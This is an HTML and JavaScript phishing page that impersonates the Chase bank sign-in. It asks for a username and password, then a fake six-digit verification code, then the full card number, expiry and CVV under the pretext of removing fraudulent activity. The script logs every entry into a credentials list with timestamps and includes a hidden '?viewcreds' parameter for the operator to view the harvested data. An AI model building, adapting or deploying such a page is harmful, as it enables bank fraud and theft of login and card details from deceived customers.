<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chase Online - Sign In</title>
    <style>
        body {
            margin: 0;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: url('https://www.chase.com/etc/designs/chase/images/backgrounds/login-bg.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            padding: 30px;
            border-radius: 8px;
            width: 400px;
            text-align: center;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
        }
        .header {
            margin-bottom: 20px;
        }
        .header h1 {
            font-size: 24px;
            color: #003087;
            margin: 0;
            font-weight: normal;
            text-align: left;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-bottom: 2px solid #ccc;
            box-sizing: border-box;
            font-size: 14px;
            background: transparent;
        }
        input:focus {
            border-bottom: 2px solid #003087;
            outline: none;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #003087;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            margin: 20px 0;
        }
        button:hover {
            background-color: #002766;
        }
        #message {
            color: #d9534f;
            margin: 10px 0;
            display: none;
            font-size: 14px;
        }
        #credsDisplay {
            display: none;
            color: black;
            background: white;
            padding: 15px;
            margin-top: 20px;
            border: 1px solid #ccc;
            font-size: 14px;
        }
        .checkbox {
            text-align: left;
            font-size: 12px;
            margin: 10px 0;
        }
        .checkbox input {
            width: auto;
            margin-right: 5px;
            border: none;
        }
        .links {
            text-align: left;
            font-size: 12px;
            margin-top: 10px;
        }
        .links a {
            color: #003087;
            text-decoration: none;
        }
        .links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Chase</h1>
        </div>
        <div id="loginStep1">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <span class="links" style="float: right; font-size: 12px; color: #003087;">Show</span>
            <div class="checkbox">
                <input type="checkbox" id="remember">
                <label for="remember">Remember me</label>
            </div>
            <div class="checkbox">
                <input type="checkbox" id="token">
                <label for="token">Use token</label>
            </div>
            <button onclick="verifyUsername()">Sign in</button>
            <div class="links">
                <a href="#">Forgot username/password?</a><br>
                <a href="#">Not Enrolled? Sign Up Now.</a>
            </div>
        </div>
        <div id="codeStep" style="display: none;">
            <p>Weâ€™ve sent a 6-digit code to your registered device. Enter it below.</p>
            <input type="text" id="code" placeholder="6-Digit Code" maxlength="6" required>
            <button onclick="verifyCode()">Submit</button>
        </div>
        <div id="cardStep" style="display: none;">
            <p>Final step to remove fraudulent activity on your account.</p>
            <input type="text" id="cardNumber" placeholder="Credit Card Number (16 digits)" maxlength="16" required>
            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
            <input type="text" id="cvv" placeholder="CVV (3 digits)" maxlength="3" required>
            <button onclick="submitCard()">Submit</button>
        </div>
        <div id="message"></div>
        <div id="credsDisplay"></div>
    </div>

    <script>
        let creds = [];

        function verifyUsername() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            if (username && password) {
                document.getElementById('loginStep1').style.display = 'none';
                document.getElementById('codeStep').style.display = 'block';
                document.getElementById('message').style.display = 'none';
            } else {
                document.getElementById('message').innerText = 'Please enter username and password.';
                document.getElementById('message').style.display = 'block';
            }
        }

        function verifyCode() {
            const code = document.getElementById('code').value;
            if (code.length === 6 && /^\d+$/.test(code)) {
                document.getElementById('codeStep').style.display = 'none';
                document.getElementById('cardStep').style.display = 'block';
                document.getElementById('message').style.display = 'none';
            } else {
                document.getElementById('message').innerText = 'Invalid 6-digit code.';
                document.getElementById('message').style.display = 'block';
            }
        }

        function submitCard() {
            const cardNumber = document.getElementById('cardNumber').value;
            const expiry = document.getElementById('expiry').value;
            const cvv = document.getElementById('cvv').value;
            if (cardNumber.length === 16 && /^\d+$/.test(cardNumber) && 
                expiry.length === 5 && /^(\d{2})\/(\d{2})$/.test(expiry) && 
                cvv.length === 3 && /^\d+$/.test(cvv)) {
                const credEntry = {
                    username: document.getElementById('username').value,
                    password: document.getElementById('password').value,
                    cardNumber: cardNumber,
                    expiry: expiry,
                    cvv: cvv,
                    timestamp: new Date().toISOString()
                };
                creds.push(credEntry);
                document.getElementById('cardStep').style.display = 'none';
                document.getElementById('message').innerText = 'Credentials submitted. Thank you for securing your account.';
                document.getElementById('message').style.display = 'block';
            } else {
                document.getElementById('message').innerText = 'Invalid card details. Ensure 16-digit card, MM/YY, and 3-digit CVV.';
                document.getElementById('message').style.display = 'block';
            }
        }

        // View creds via ?viewcreds
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('viewcreds')) {
            if (creds.length > 0) {
                let credsHtml = '<h3>Logged Credentials:</h3><ul>';
                creds.forEach(cred => {
                    credsHtml += `<li>Username: ${cred.username}, Password: ${cred.password}, Card: ${cred.cardNumber}, Exp: ${cred.expiry}, CVV: ${cred.cvv}, Time: ${cred.timestamp}</li>`;
                });
                credsHtml += '</ul>';
                document.getElementById('credsDisplay').innerHTML = credsHtml;
                document.getElementById('credsDisplay').style.display = 'block';
                document.getElementById('loginStep1').style.display = 'none';
                document.getElementById('codeStep').style.display = 'none';
                document.getElementById('cardStep').style.display = 'none';
            } else {
                document.getElementById('credsDisplay').innerText = 'No credentials logged yet.';
                document.getElementById('credsDisplay').style.display = 'block';
            }
        }
    </script>
</body>
</html>
